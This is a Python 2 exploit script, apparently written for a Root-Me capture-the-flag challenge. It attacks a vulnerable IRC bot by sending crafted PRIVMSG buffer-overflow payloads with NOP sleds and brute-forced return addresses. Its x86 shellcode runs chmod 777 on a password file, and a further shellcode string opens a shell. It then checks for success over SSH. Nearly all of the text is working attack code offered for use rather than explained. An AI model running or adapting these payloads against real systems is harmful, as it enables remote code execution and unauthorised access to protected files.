#REMOTELY?

import socket
import time
import thread
import spur  #library for handle ssh connection to irc vm
import sys

SERVER = "irc.root-me.org"   #irc.root-me.org #bullcantshit.noip.me
PORT = 6667

s = socket.socket()
s.connect((SERVER, PORT))
s.send("NICK Hilman\r\n")
s.send("USER Hilman Hilman Hilman :Hilman\r\n")

rshell="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x31\xdb\xb3\x02\x68\x25\xbb\xe1\xbb\x66\x68\x7a\x69\x66\x53\xfe\xc3\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80"

pong = False
_ping = ""

ison = False


#this function has got to fabricate all the possible return address on the stack to hit the shellcode ,it's brutal, I know.
def addr_fabricator():
    addr_fabricator.retaddr = 0xbfffdfff #for the static variables
    addr_fabricator.retaddr+=0x2
    rets = str(hex(addr_fabricator.retaddr))
    rets = rets[:-1]
    byte1=rets[8]+rets[9] #break the address in byte and finally compose the big endian string
    byte2=rets[6]+rets[7]
    byte3=rets[4]+rets[5]
    byte4=rets[2]+rets[3]
    return "\\x"+byte1+"\\x"+byte2+"\\x"+byte3+"\\x"+byte4

#initial connection to IRC channel
def connection():
    connected = False
    while True:
        data = s.recv(4096)
        print data
        if data.find('PING') != -1:
            s.send('PONG :' + data.split(':')[1])
            if not connected:
                connected = True
                s.sendall("JOIN #root-me_challenge\r\n") #root-me_challenge #test
                break

#unique receiver for both ping_pong and attack functions, otherwise if
#they call their own 's.recv' there will be chaos OR deadlocks
def receiver(threadName):
    global s
    while True:
        #print"w8ing"
        data = s.recv(4096)
        #print data
        if data.find('PING') != -1:
            #print "matched ping"
            global pong
            global _ping
            _ping = data
            pong = True
        elif data.find('303 Hilman :Pown3dBot') != -1:
            global ison
            ison = True

#handle the ping-pong to stay connected to the irc server
def ping_pong(threadName):
    global s
    global pong
    global _ping
    time.sleep(5)
    while True:
        if(pong==True):
            print _ping
            s.send('PONG :' + _ping.split(':')[1])
            pong = False
        else:
            time.sleep(2)

#test if exploit works by reading the permission
#of the file .passwd on the remote machine
def maybeitworks():
    shell = spur.SshShell(hostname="challenge02.root-me.org",
                      username="rbinary1",
                      password="rbinary1",
                      port=2222,
                      missing_host_key = spur.ssh.MissingHostKey.accept)

    result = shell.run(["ls" , "-la"])
    res = result.output
    _passwd = res.splitlines()[4]
    perms = _passwd[1] + _passwd[2]+_passwd[3]
    if perms == "r--":
        return False
    else:
        return True

#The gun! it prepares the exploit and launches it!
def attack(threadName):
    global s

    plusled="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    # with gdb ./rbinary1 the right address is \x0c\xee\xff\xbf
    #chmod of /challenge/rbinary/rbinary1/.passwd
    chmod = plusled + "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x89\xc3\x31\xd8\x50\xc7\x44\x24\xdc\x2f\x63\x68\x61\xc7\x44\x24\xe0\x6c\x6c\x65\x6e\xc7\x44\x24\xe4\x67\x65\x2f\x72\xc7\x44\x24\xe8\x62\x69\x6e\x61\xc7\x44\x24\xec\x72\x79\x2f\x72\xc7\x44\x24\xf0\x62\x69\x6e\x61\xc7\x44\x24\xf4\x72\x79\x31\x2f\xc7\x44\x24\xf8\x2f\x2e\x70\x61\xc7\x44\x24\xfc\x73\x73\x77\x64\x83\xec\x24\x89\xe3\x66\x68\xff\x01\x66\x59\xb0\x0f\xcd\x80\x31\xdb\x31\xc0\xb0\x01\xcd\x80" #chmod 777 .passwd shellcode 44 bytes
    nameinj="\x21AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPRIVMSG\x20"

    rd = addr_fabricator() # more or less an address in the middle of the stack that store msg struct   #OK on local ./rbinary1 ( clowndBot connected to irc-root-me ) !!!
    addrinj="\x21AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+rd

    attemp=1
    global ison

    time.sleep(10)
    print "Starting attack with RETaddress " + rd +"! Grrrrrr"

    while True:
        if(ison==True):
            attemp+=1
            time.sleep(2)
            print "Attemp "+str(attemp) + "with address " + rd
            print "injection of handler address"
            s.sendall('PRIVMSG Pown3dBot :%s\r\n' %addrinj)   #this for overwrite the address in the handler for 376
            time.sleep(0.5)
            print "injection of the fake name"
            s.sendall('PRIVMSG Pown3dBot :%s\r\n' %nameinj)   #this for overwrite the name from 376 to PRIVMSG
            time.sleep(2.5)
            print "Trying to trigger the exploit"
            s.sendall('PRIVMSG Pown3dBot :%s\r\n' %chmod)
            ison = False
            end=maybeitworks()
            if(end==True):
                print "-------[FIND]Address is: " + rd +"--------"
                sys.exit()
        time.sleep(2)
        s.sendall("ISON Pown3dBot\r\n") #see if Pown3dBot is ON or NOT
        #print "Pown3dbot IsOn?"


connection()
print "Hilman connected, now generating threads!"



time.sleep(1)
try:
    thread.start_new_thread(ping_pong,("thread1",))
    thread.start_new_thread(attack,("thread2",))
    thread.start_new_thread(receiver,("thread3",))
except:
    print "Error: unable to launch threads!"

while 1:
    pass #nop nop nop nop :)